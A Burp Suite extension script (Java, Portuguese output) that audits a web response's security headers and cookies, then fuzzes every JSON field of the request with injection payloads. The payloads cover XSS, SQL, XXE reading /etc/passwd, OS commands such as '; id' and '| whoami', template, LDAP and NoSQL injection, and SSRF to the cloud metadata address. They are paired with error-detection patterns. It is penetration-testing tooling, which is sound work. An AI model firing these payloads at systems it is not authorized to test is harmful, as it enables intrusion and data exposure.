// ================= PART A: STATIC SECURITY CHECKLIST AUDIT =================

var baseReq = requestResponse.request();
var baseRes = requestResponse.response();

if (baseRes == null) {
    logging.logToOutput("[!] No response available. Send the request first.");
    return;
}

var baseBody = baseRes.bodyToString();
var baseUrl = baseReq.url();
var findings = new java.util.ArrayList<String>();
var passed = new java.util.ArrayList<String>();
var manualReview = new java.util.ArrayList<String>();

java.util.function.Function<String, String> getResHeader = (name) -> {
    for (var h : baseRes.headers()) {
        if (h.name().equalsIgnoreCase(name)) return h.value();
    }
    return null;
};

java.util.function.Function<String, String> getReqHeaderVal = (name) -> {
    for (var h : baseReq.headers()) {
        if (h.name().equalsIgnoreCase(name)) return h.value();
    }
    return null;
};

boolean isHttps = baseUrl.startsWith("https://");
if (isHttps) passed.add("HTTPS em uso");
else findings.add("[CRITICAL] Comunicacao sem HTTPS: " + baseUrl);

String hstsHeader = getResHeader.apply("Strict-Transport-Security");
if (hstsHeader != null && hstsHeader.contains("max-age")) passed.add("HSTS presente: " + hstsHeader);
else findings.add("[HIGH] Strict-Transport-Security ausente ou malformado");

var setCookieList = new java.util.ArrayList<String>();
for (var h : baseRes.headers()) {
    if (h.name().equalsIgnoreCase("Set-Cookie")) setCookieList.add(h.value());
}

if (setCookieList.isEmpty()) {
    manualReview.add("Nenhum Set-Cookie nesta resposta - testar fluxo de login separadamente");
} else {
    for (String cookieEntry : setCookieList) {
        String cookieName = cookieEntry.split("=")[0];
        boolean hasHttpOnly = cookieEntry.toLowerCase().contains("httponly");
        boolean hasSecureFlag = cookieEntry.toLowerCase().contains("secure");
        boolean hasSameSite = cookieEntry.toLowerCase().contains("samesite");

        if (!hasHttpOnly) findings.add("[HIGH] Cookie sem HttpOnly: " + cookieName);
        if (!hasSecureFlag) findings.add("[HIGH] Cookie sem Secure: " + cookieName);
        if (!hasSameSite) findings.add("[MEDIUM] Cookie sem SameSite: " + cookieName);
        if (hasHttpOnly && hasSecureFlag && hasSameSite) passed.add("Cookie " + cookieName + " com flags corretas");
    }
}

manualReview.add("Expiracao de sessao por inatividade - requer teste temporal manual");
manualReview.add("Invalidacao de sessao pos-logout - reenviar request antigo apos logout");
manualReview.add("Session Fixation / regeneracao de token - comparar cookie pre/pos login");
manualReview.add("Rate limiting em login/brute force - usar Intruder com multiplas tentativas");
manualReview.add("Reset de senha nao deve expor email/ID - inspecionar resposta manualmente");
manualReview.add("Injecao em headers HTTP - testar X-Forwarded-For, User-Agent, Referer manualmente");
manualReview.add("XSS armazenado - revisitar pagina apos submissao em outro contexto");
manualReview.add("Acesso a endpoints restritos sem autenticacao - remover Authorization e reenviar");
manualReview.add("Autorizacao por nivel de usuario - testar com token de menor privilegio");
manualReview.add("Tampering de IDs/precos client-side - alterar valores numericos sensiveis manualmente");

var sensitiveFieldPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)\"password\"\\s*:"),
    java.util.regex.Pattern.compile("(?i)\"token\"\\s*:\\s*\"[\\w\\-\\.]{10,}\""),
    java.util.regex.Pattern.compile("(?i)\"api[_-]?key\"\\s*:"),
    java.util.regex.Pattern.compile("(?i)\"secret\"\\s*:"),
    java.util.regex.Pattern.compile("(?i)\"ssn\"\\s*:"),
    java.util.regex.Pattern.compile("(?i)\"credit[_-]?card\"\\s*:")
);

boolean sensitiveInBody = sensitiveFieldPatterns.stream().anyMatch(p -> p.matcher(baseBody).find());
if (sensitiveInBody) findings.add("[HIGH] Possiveis dados sensiveis nao mascarados na resposta JSON");
else passed.add("Nenhum campo sensivel obvio exposto na resposta");

boolean sensitiveInUrl = baseUrl.matches("(?i).*[?&](password|token|api_key|secret|ssn)=.*");
if (sensitiveInUrl) findings.add("[HIGH] Dados sensiveis expostos como parametro GET na URL");
else passed.add("Nenhum dado sensivel na URL/query string");

String reqContentType = getReqHeaderVal.apply("Content-Type");
if (reqContentType != null && reqContentType.contains("multipart/form-data")) {
    manualReview.add("Upload detectado - validar extensao/MIME e testar path traversal no filename manualmente");
}

String rateLimitHeaderVal = getResHeader.apply("X-RateLimit-Limit");
String retryAfterVal = getResHeader.apply("Retry-After");
if (rateLimitHeaderVal != null || retryAfterVal != null) passed.add("Indicador de rate limiting presente nos headers");
else manualReview.add("Rate limiting nao confirmado via headers - testar com flood de requisicoes");

String xfoHeader = getResHeader.apply("X-Frame-Options");
String cspHeader = getResHeader.apply("Content-Security-Policy");

if (xfoHeader != null && (xfoHeader.equalsIgnoreCase("DENY") || xfoHeader.equalsIgnoreCase("SAMEORIGIN"))) {
    passed.add("X-Frame-Options: " + xfoHeader);
} else if (cspHeader != null && cspHeader.contains("frame-ancestors")) {
    passed.add("frame-ancestors presente na CSP");
} else {
    findings.add("[MEDIUM] X-Frame-Options ausente e sem frame-ancestors (risco de Clickjacking)");
}

if (cspHeader != null) {
    passed.add("CSP presente: " + cspHeader);
    if (cspHeader.contains("unsafe-inline") || cspHeader.contains("unsafe-eval") || cspHeader.contains("*")) {
        findings.add("[MEDIUM] CSP permissiva demais (unsafe-inline/unsafe-eval/*)");
    }
} else {
    findings.add("[HIGH] Content-Security-Policy ausente");
}

String xctoHeader = getResHeader.apply("X-Content-Type-Options");
if (xctoHeader != null && xctoHeader.equalsIgnoreCase("nosniff")) passed.add("X-Content-Type-Options: nosniff presente");
else findings.add("[LOW] X-Content-Type-Options ausente");

String referrerPolicyHeader = getResHeader.apply("Referrer-Policy");
if (referrerPolicyHeader != null) passed.add("Referrer-Policy presente: " + referrerPolicyHeader);
else findings.add("[LOW] Referrer-Policy ausente");

boolean hasCsrfIndicator = baseBody.toLowerCase().contains("csrf") || baseBody.toLowerCase().contains("_token");
if (hasCsrfIndicator) passed.add("Indicador de token CSRF encontrado na resposta");
else manualReview.add("Nenhum token CSRF visivel - verificar formularios criticos");
manualReview.add("Renovacao de token CSRF ao longo da sessao - requer multiplas requisicoes");

int baseStatus = baseRes.statusCode();
String locationHeader = getResHeader.apply("Location");
if (baseStatus >= 300 && baseStatus < 400 && locationHeader != null) {
    boolean sameOrigin = locationHeader.startsWith("/") || locationHeader.contains(baseReq.httpService().host());
    if (!sameOrigin) findings.add("[MEDIUM] Redirecionamento para dominio externo: " + locationHeader);
    else passed.add("Redirecionamento para mesmo dominio: " + locationHeader);
}

manualReview.add("Open Redirect via parametro manipulavel - testar redirect/url/next com dominio externo");

String serverHeaderVal = getResHeader.apply("Server");
String poweredByHeaderVal = getResHeader.apply("X-Powered-By");
if (serverHeaderVal != null) findings.add("[LOW] Header Server expoe tecnologia: " + serverHeaderVal);
if (poweredByHeaderVal != null) findings.add("[LOW] Header X-Powered-By expoe tecnologia: " + poweredByHeaderVal);
manualReview.add("Versoes vulneraveis de bibliotecas/CVEs - usar Retire.js ou OWASP Dependency-Check");

var debugSignaturePatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)\\bstack ?trace\\b"),
    java.util.regex.Pattern.compile("(?i)Traceback \\(most recent call last\\)"),
    java.util.regex.Pattern.compile("(?i)Whitelabel Error Page"),
    java.util.regex.Pattern.compile("(?i)Fatal error:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Warning:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Notice:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)debug\\s*=\\s*true"),
    java.util.regex.Pattern.compile("(?i)at\\s+[\\w.$]+\\([\\w.]+:\\d+\\)"),
    java.util.regex.Pattern.compile("(?i)Caused by:"),
    java.util.regex.Pattern.compile("(?i)UnhandledPromiseRejection"),
    java.util.regex.Pattern.compile("(?i)TypeError:.*"),
    java.util.regex.Pattern.compile("(?i)ReferenceError:.*"),
    java.util.regex.Pattern.compile("(?i)SyntaxError:.*"),
    java.util.regex.Pattern.compile("(?i)\\bjava\\.lang\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bSystem\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bcom\\.fasterxml\\.jackson\\b"),
    java.util.regex.Pattern.compile("(?i)\\borg\\.springframework\\.\\w+\\b")
);

boolean baseDebugExposed = debugSignaturePatterns.stream().anyMatch(p -> p.matcher(baseBody).find());
if (baseDebugExposed) findings.add("[HIGH] Mensagens de debug/stack trace expostas na resposta base");
else passed.add("Nenhuma mensagem de debug/stack trace detectada na resposta base");

logging.logToOutput("========== PARTE A: AUDITORIA DE CHECKLIST ==========");
logging.logToOutput("URL: " + baseUrl + " | Status: " + baseStatus + " | Tamanho: " + baseBody.length());
logging.logToOutput("--- FALHAS (" + findings.size() + ") ---");
for (String f : findings) logging.logToOutput(f);
logging.logToOutput("--- APROVADO (" + passed.size() + ") ---");
for (String p : passed) logging.logToOutput("[OK] " + p);
logging.logToOutput("--- REQUER VERIFICACAO MANUAL (" + manualReview.size() + ") ---");
for (String m : manualReview) logging.logToOutput("[MANUAL] " + m);
logging.logToOutput("========== FIM PARTE A ==========");
logging.logToOutput("");

// ================= PART B: INJECTION FUZZER =================

var sqliPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)SQL syntax.*MySQL"),
    java.util.regex.Pattern.compile("(?i)Warning.*mysql_"),
    java.util.regex.Pattern.compile("(?i)valid MySQL result"),
    java.util.regex.Pattern.compile("(?i)MySqlException"),
    java.util.regex.Pattern.compile("(?i)PostgreSQL.*ERROR"),
    java.util.regex.Pattern.compile("(?i)Npgsql\\."),
    java.util.regex.Pattern.compile("(?i)PSQLException"),
    java.util.regex.Pattern.compile("(?i)SQL Server.*Driver"),
    java.util.regex.Pattern.compile("(?i)System\\.Data\\.SqlClient"),
    java.util.regex.Pattern.compile("(?i)Unclosed quotation mark"),
    java.util.regex.Pattern.compile("(?i)com\\.microsoft\\.sqlserver\\.jdbc"),
    java.util.regex.Pattern.compile("ORA-\\d{5}"),
    java.util.regex.Pattern.compile("(?i)oracle\\.jdbc"),
    java.util.regex.Pattern.compile("(?i)SQLITE_ERROR"),
    java.util.regex.Pattern.compile("(?i)sqlite3\\.OperationalError"),
    java.util.regex.Pattern.compile("(?i)SQLSTATE\\[\\w+\\]"),
    java.util.regex.Pattern.compile("(?i)org\\.hibernate\\."),
    java.util.regex.Pattern.compile("(?i)com\\.mysql\\.jdbc"),
    java.util.regex.Pattern.compile("(?i)java\\.sql\\.SQLException"),
    java.util.regex.Pattern.compile("(?i)syntax error.*near"),
    java.util.regex.Pattern.compile("(?i)quoted string not properly terminated"),
    java.util.regex.Pattern.compile("(?i)DB2 SQL error")
);

var xxePatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)DOCTYPE.*ENTITY"),
    java.util.regex.Pattern.compile("(?i)org\\.xml\\.sax\\.SAXParseException"),
    java.util.regex.Pattern.compile("(?i)XMLSyntaxError"),
    java.util.regex.Pattern.compile("(?i)external entity"),
    java.util.regex.Pattern.compile("(?i)libxml"),
    java.util.regex.Pattern.compile("(?i)javax\\.xml\\.parsers"),
    java.util.regex.Pattern.compile("(?i)DocumentBuilderFactory"),
    java.util.regex.Pattern.compile("(?i)ExpatError"),
    java.util.regex.Pattern.compile("(?i)lxml\\.etree"),
    java.util.regex.Pattern.compile("root:.*:0:0:")
);

var osiPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("uid=\\d+\\(\\w+\\)\\s+gid=\\d+"),
    java.util.regex.Pattern.compile("(?i)root:.*:0:0:"),
    java.util.regex.Pattern.compile("(?i)Directory of [A-Z]:\\\\"),
    java.util.regex.Pattern.compile("(?i)Volume Serial Number"),
    java.util.regex.Pattern.compile("(?i)/bin/(ba)?sh"),
    java.util.regex.Pattern.compile("(?i)command not found"),
    java.util.regex.Pattern.compile("(?i)is not recognized as an internal or external command"),
    java.util.regex.Pattern.compile("(?i)sh:\\s*\\d+:"),
    java.util.regex.Pattern.compile("(?i)cannot access"),
    java.util.regex.Pattern.compile("(?i)No such file or directory"),
    java.util.regex.Pattern.compile("(?i)permission denied")
);

var sstiPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("\\b49\\b"),
    java.util.regex.Pattern.compile("(?i)freemarker\\.template"),
    java.util.regex.Pattern.compile("(?i)freemarker\\.core"),
    java.util.regex.Pattern.compile("(?i)org\\.apache\\.velocity"),
    java.util.regex.Pattern.compile("(?i)jinja2\\.exceptions"),
    java.util.regex.Pattern.compile("(?i)TemplateSyntaxError"),
    java.util.regex.Pattern.compile("(?i)twig.*error"),
    java.util.regex.Pattern.compile("(?i)org\\.thymeleaf")
);

var nosqliPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)MongoError"),
    java.util.regex.Pattern.compile("(?i)MongoServerError"),
    java.util.regex.Pattern.compile("(?i)BSONError"),
    java.util.regex.Pattern.compile("(?i)com\\.mongodb\\."),
    java.util.regex.Pattern.compile("(?i)E11000 duplicate key"),
    java.util.regex.Pattern.compile("(?i)unknown operator"),
    java.util.regex.Pattern.compile("(?i)\\$where.*not supported"),
    java.util.regex.Pattern.compile("(?i)CastError"),
    java.util.regex.Pattern.compile("(?i)ValidationError.*Mongoose")
);

var ldapPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)LDAPException"),
    java.util.regex.Pattern.compile("(?i)javax\\.naming\\.directory"),
    java.util.regex.Pattern.compile("(?i)invalid DN syntax"),
    java.util.regex.Pattern.compile("(?i)LDAP: error code \\d+"),
    java.util.regex.Pattern.compile("(?i)com\\.sun\\.jndi\\.ldap")
);

var ssrfPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("(?i)ami-id"),
    java.util.regex.Pattern.compile("(?i)instance-id"),
    java.util.regex.Pattern.compile("(?i)computeMetadata"),
    java.util.regex.Pattern.compile("(?i)169\\.254\\.169\\.254"),
    java.util.regex.Pattern.compile("(?i)ConnectException"),
    java.util.regex.Pattern.compile("(?i)Connection refused"),
    java.util.regex.Pattern.compile("(?i)No route to host")
);

var genericErrorPatterns = java.util.List.of(
    java.util.regex.Pattern.compile("at\\s+[\\w.$]+\\([\\w.]+:\\d+\\)"),
    java.util.regex.Pattern.compile("(?i)\\bjava\\.lang\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)\\bjava\\.\\w+\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)Caused by:"),
    java.util.regex.Pattern.compile("(?i)Traceback \\(most recent call last\\)"),
    java.util.regex.Pattern.compile("(?i)File \".*\\.py\", line \\d+"),
    java.util.regex.Pattern.compile("(?i)System\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)Microsoft\\.\\w+\\.\\w+Exception"),
    java.util.regex.Pattern.compile("(?i)at\\s+System\\."),
    java.util.regex.Pattern.compile("(?i)Fatal error:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Warning:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Notice:.*on line \\d+"),
    java.util.regex.Pattern.compile("(?i)Uncaught\\s+\\w*Exception"),
    java.util.regex.Pattern.compile("(?i)at\\s+Object\\.<anonymous>"),
    java.util.regex.Pattern.compile("(?i)node_modules[\\\\/]"),
    java.util.regex.Pattern.compile("(?i)TypeError:.*is not a function"),
    java.util.regex.Pattern.compile("(?i)UnhandledPromiseRejection"),
    java.util.regex.Pattern.compile("(?i)NoMethodError"),
    java.util.regex.Pattern.compile("(?i)ActiveRecord::\\w+Error"),
    java.util.regex.Pattern.compile("(?i)\\.rb:\\d+:in"),
    java.util.regex.Pattern.compile("(?i)panic:.*goroutine"),
    java.util.regex.Pattern.compile("(?i)\\bstack ?trace\\b"),
    java.util.regex.Pattern.compile("(?i)\\bnullpointerexception\\b"),
    java.util.regex.Pattern.compile("(?i)\\bclasscastexception\\b"),
    java.util.regex.Pattern.compile("(?i)\\bindexoutofbounds\\w*\\b"),
    java.util.regex.Pattern.compile("(?i)\\bunexpected token\\b"),
    java.util.regex.Pattern.compile("(?i)\\bjson\\s*(parse|decode|deserializ\\w+)\\s*error"),
    java.util.regex.Pattern.compile("(?i)\\bmalformed\\s+json\\b"),
    java.util.regex.Pattern.compile("(?i)\\binvalid\\s+json\\b"),
    java.util.regex.Pattern.compile("(?i)\\bJsonParseException\\b"),
    java.util.regex.Pattern.compile("(?i)\\bJsonMappingException\\b"),
    java.util.regex.Pattern.compile("(?i)\\bcom\\.fasterxml\\.jackson\\b"),
    java.util.regex.Pattern.compile("(?i)\\bcom\\.google\\.gson\\b"),
    java.util.regex.Pattern.compile("(?i)\\bschema\\s+validation\\s+(failed|error)\\b"),
    java.util.regex.Pattern.compile("(?i)\\binvalid\\s+(input|value|parameter|argument|type|format|field)\\b"),
    java.util.regex.Pattern.compile("(?i)\\bunexpected\\s+(character|value|type)\\b"),
    java.util.regex.Pattern.compile("(?i)\\binternal\\s+server\\s+error\\b"),
    java.util.regex.Pattern.compile("(?i)\\b500\\s+error\\b"),
    java.util.regex.Pattern.compile("(?i)\\bunhandled\\s+exception\\b"),
    java.util.regex.Pattern.compile("(?i)\\bexception\\s+occurred\\b"),
    java.util.regex.Pattern.compile("(?i)\\bdebug\\s*=\\s*true\\b"),
    java.util.regex.Pattern.compile("(?i)\\bwhitelabel\\s+error\\s+page\\b"),
    java.util.regex.Pattern.compile("(?i)\\bcom\\.sun\\.\\w+\\b"),
    java.util.regex.Pattern.compile("(?i)\\borg\\.springframework\\.\\w+\\b")
);

var stringVulns = new java.util.ArrayList<Object[]>();
stringVulns.add(new Object[]{"XSS-svg", "\"><svg/onload=alert(1)>", java.util.List.of()});
stringVulns.add(new Object[]{"XSS-script", "<script>alert(1)</script>", java.util.List.of()});
stringVulns.add(new Object[]{"XSS-img", "<img src=x onerror=alert(1)>", java.util.List.of()});
stringVulns.add(new Object[]{"XSS-attr", "\" onmouseover=alert(1) x=\"", java.util.List.of()});
stringVulns.add(new Object[]{"SQLi-or", "' OR '1'='1", sqliPatterns});
stringVulns.add(new Object[]{"SQLi-union", "' UNION SELECT NULL,NULL--", sqliPatterns});
stringVulns.add(new Object[]{"SQLi-dual", "'||(select 1 from dual)--", sqliPatterns});
stringVulns.add(new Object[]{"SQLi-quote", "'", sqliPatterns});
stringVulns.add(new Object[]{"SQLi-sleep", "' OR SLEEP(0)--", sqliPatterns});
stringVulns.add(new Object[]{"SQLi-boolean", "' AND 1=CONVERT(int,'a')--", sqliPatterns});
stringVulns.add(new Object[]{"XXE-passwd", "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>", xxePatterns});
stringVulns.add(new Object[]{"XXE-param", "<!DOCTYPE x [<!ENTITY % xxe SYSTEM \"http://127.0.0.1/xxe\">%xxe;]>", xxePatterns});
stringVulns.add(new Object[]{"OSInjection-semi", "; id", osiPatterns});
stringVulns.add(new Object[]{"OSInjection-pipe", "| whoami", osiPatterns});
stringVulns.add(new Object[]{"OSInjection-backtick", "`id`", osiPatterns});
stringVulns.add(new Object[]{"OSInjection-sub", "$(id)", osiPatterns});
stringVulns.add(new Object[]{"OSInjection-and", "&& whoami", osiPatterns});
stringVulns.add(new Object[]{"SSTI-math", "{{7*7}}", sstiPatterns});
stringVulns.add(new Object[]{"SSTI-freemarker", "${7*7}", sstiPatterns});
stringVulns.add(new Object[]{"SSTI-velocity", "#set($x=7*7)$x", sstiPatterns});
stringVulns.add(new Object[]{"SSTI-erb", "<%= 7*7 %>", sstiPatterns});
stringVulns.add(new Object[]{"LDAPi-wildcard", "*)(uid=*))(|(uid=*", ldapPatterns});
stringVulns.add(new Object[]{"LDAPi-bypass", "*)(&", ldapPatterns});
stringVulns.add(new Object[]{"SSRF-metadata", "http://169.254.169.254/latest/meta-data/", ssrfPatterns});
stringVulns.add(new Object[]{"SSRF-localhost", "http://127.0.0.1:80", ssrfPatterns});
stringVulns.add(new Object[]{"SSRF-internal", "http://localhost/admin", ssrfPatterns});
stringVulns.add(new Object[]{"CRLFi", "test%0d%0aSet-Cookie:%20injected=true", java.util.List.of()});
stringVulns.add(new Object[]{"PathTraversal", "../../../../etc/passwd", java.util.List.of()});
stringVulns.add(new Object[]{"NullByte", "test%00.jpg", java.util.List.of()});
stringVulns.add(new Object[]{"LongString", "A".repeat(5000), java.util.List.of()});
stringVulns.add(new Object[]{"EmptyString", "", java.util.List.of()});
stringVulns.add(new Object[]{"UnicodeConfusion", "\u0000\u202e\uFEFF", java.util.List.of()});

var nosqliRawPayloads = new java.util.ArrayList<Object[]>();
nosqliRawPayloads.add(new Object[]{"NoSQLi-ne", "{\"$ne\": null}"});
nosqliRawPayloads.add(new Object[]{"NoSQLi-gt", "{\"$gt\": \"\"}"});
nosqliRawPayloads.add(new Object[]{"NoSQLi-where", "{\"$where\": \"1==1\"}"});
nosqliRawPayloads.add(new Object[]{"NoSQLi-regex", "{\"$regex\": \".*\"}"});

var numberVulns = new java.util.ArrayList<Object[]>();
numberVulns.add(new Object[]{"valid-number", 123L});
numberVulns.add(new Object[]{"zero", 0L});
numberVulns.add(new Object[]{"negative-number", -1L});
numberVulns.add(new Object[]{"overflow-number", 99999999999999999L});
numberVulns.add(new Object[]{"int-max", 2147483647L});
numberVulns.add(new Object[]{"int-max-plus-1", 2147483648L});
numberVulns.add(new Object[]{"long-max", Long.MAX_VALUE});

var numberTypeConfusion = "123abc";
var originalBody = baseReq.bodyToString();

var leaves = new java.util.ArrayList<String[]>();
var jsonStack = new java.util.ArrayDeque<burp.api.montoya.utilities.json.JsonNode>();
var pathStack = new java.util.ArrayDeque<String>();
jsonStack.push(burp.api.montoya.utilities.json.JsonNode.jsonNode(originalBody));
pathStack.push("");

while (!jsonStack.isEmpty()) {
    var current = jsonStack.pop();
    var currentPath = pathStack.pop();

    if (current.isObject()) {
        var map = current.asObject().asMap();
        for (String key : new java.util.ArrayList<>(map.keySet())) {
            String nextPath = currentPath.isEmpty() ? key : currentPath + "." + key;
            jsonStack.push(map.get(key));
            pathStack.push(nextPath);
        }
        continue;
    }

    if (current.isArray()) {
        int i = 0;
        for (var child : current.asArray().asList()) {
            jsonStack.push(child);
            pathStack.push(currentPath + "[" + i + "]");
            i++;
        }
        continue;
    }

    if (current.isString()) leaves.add(new String[]{currentPath, "STRING"});
    else if (current.isNumber()) leaves.add(new String[]{currentPath, "NUMBER"});
}

logging.logToOutput("========== PARTE B: FUZZER DE INJECAO ==========");
logging.logToOutput("[*] Found " + leaves.size() + " leaf parameters to fuzz");
logging.logToOutput(String.format("%-6s | %-30s | %-24s | %-8s | %s", "STATUS", "PARAM", "CATEGORY", "LENGTH", "PAYLOAD"));

for (String[] leaf : leaves) {
    String targetPath = leaf[0];
    String type = leaf[1];

    boolean isArrayPath = targetPath.contains("[");
    String arrayFieldPath = null;
    String nestedKey = null;
    int targetIndex = -1;

    if (isArrayPath) {
        int bracketOpen = targetPath.indexOf('[');
        int bracketClose = targetPath.indexOf(']');
        arrayFieldPath = targetPath.substring(0, bracketOpen);
        targetIndex = Integer.parseInt(targetPath.substring(bracketOpen + 1, bracketClose));
        String remainder = targetPath.substring(bracketClose + 1);
        nestedKey = remainder.startsWith(".") ? remainder.substring(1) : null;
    }

    String[] parts = isArrayPath ? arrayFieldPath.split("\\.") : targetPath.split("\\.");
    String lastKey = isArrayPath ? null : parts[parts.length - 1];

    var mutations = new java.util.ArrayList<Object[]>();
    if (type.equals("STRING")) {
        for (Object[] v : stringVulns) mutations.add(new Object[]{v[0], v[1], false, false, v[2]});
        for (Object[] v : nosqliRawPayloads) mutations.add(new Object[]{v[0], v[1], false, true, nosqliPatterns});
    } else {
        for (Object[] v : numberVulns) mutations.add(new Object[]{v[0], v[1], true, false, java.util.List.of()});
        mutations.add(new Object[]{"type-confusion", numberTypeConfusion, false, false, java.util.List.of()});
        for (Object[] v : stringVulns) mutations.add(new Object[]{v[0] + "-on-number", v[1], false, false, v[2]});
        for (Object[] v : nosqliRawPayloads) mutations.add(new Object[]{v[0] + "-on-number", v[1], false, true, nosqliPatterns});
    }

    for (Object[] mutation : mutations) {
        String label = (String) mutation[0];
        Object payload = mutation[1];
        boolean isNumberType = (Boolean) mutation[2];
        boolean isRawJson = (Boolean) mutation[3];
        @SuppressWarnings("unchecked")
        var patterns = (java.util.List<java.util.regex.Pattern>) mutation[4];

        var freshJson = burp.api.montoya.utilities.json.JsonNode.jsonNode(originalBody);
        var node = freshJson;

        if (isArrayPath) {
            for (int i = 0; i < parts.length; i++) node = node.asObject().asMap().get(parts[i]);
            var arrayNode = node.asArray();
            var elements = new java.util.ArrayList<>(arrayNode.asList());
            for (int i = elements.size() - 1; i >= 0; i--) arrayNode.remove(0);

            for (int i = 0; i < elements.size(); i++) {
                if (i == targetIndex) {
                    if (nestedKey != null) {
                        var elementCopy = elements.get(i).asObject();
                        if (isRawJson) {
                            var rawNode = burp.api.montoya.utilities.json.JsonNode.jsonNode((String) payload);
                            elementCopy.asMap().put(nestedKey, rawNode);
                        } else if (isNumberType) {
                            elementCopy.putNumber(nestedKey, (Long) payload);
                        } else {
                            elementCopy.putString(nestedKey, (String) payload);
                        }
                        arrayNode.add(elementCopy);
                    } else {
                        if (isNumberType) arrayNode.addNumber((Long) payload);
                        else arrayNode.addString((String) payload);
                    }
                } else {
                    arrayNode.add(elements.get(i));
                }
            }
        } else {
            for (int i = 0; i < parts.length - 1; i++) node = node.asObject().asMap().get(parts[i]);
            if (isRawJson) {
                var rawNode = burp.api.montoya.utilities.json.JsonNode.jsonNode((String) payload);
                node.asObject().asMap().put(lastKey, rawNode);
            } else if (isNumberType) {
                node.asObject().putNumber(lastKey, (Long) payload);
            } else {
                node.asObject().putString(lastKey, (String) payload);
            }
        }

        var mutatedBody = freshJson.toJsonString();
        var mutatedRequest = baseReq.withBody(mutatedBody).withService(baseReq.httpService());

        if (mutatedRequest.httpService() == null) {
            logging.logToOutput("[!] No HttpService, skipping: " + targetPath);
            continue;
        }

        var result = api.http().sendRequest(mutatedRequest);

        if (result.response() == null) {
            logging.logToOutput(String.format("%-6s | %-30s | %-24s | %-8s | %s", "NONE", targetPath, label, "0", payload));
            continue;
        }

        var fuzzRespBody = result.response().bodyToString();
        int fuzzStatus = result.response().statusCode();
        int fuzzLength = fuzzRespBody.length();

        boolean specificHit = patterns.stream().anyMatch(p -> p.matcher(fuzzRespBody).find());
        boolean genericHit = genericErrorPatterns.stream().anyMatch(p -> p.matcher(fuzzRespBody).find());
        boolean dynamicDebugHit = debugSignaturePatterns.stream().anyMatch(p -> p.matcher(fuzzRespBody).find());
        boolean reflected = !isNumberType && !isRawJson && payload instanceof String
            && (label.startsWith("XSS") || label.startsWith("SSTI"))
            && fuzzRespBody.contains((String) payload);

        String logLine = String.format("%-30s | %-24s | %-8d | %s", targetPath, label, fuzzLength, payload);

        if (dynamicDebugHit) {
            logging.logToOutput(fuzzStatus + " [DEBUG] " + logLine + " | verbose error exposed");
        } else if (specificHit || genericHit || reflected || fuzzStatus >= 500) {
            logging.logToOutput(fuzzStatus + " [HIT] " + logLine);
        } else if (fuzzStatus == 400) {
            logging.logToOutput(fuzzStatus + " [400] " + logLine);
        } else {
            logging.logToOutput(fuzzStatus + " [ok]  " + logLine);
        }
    }
}

logging.logToOutput("[*] Fuzzing complete.");
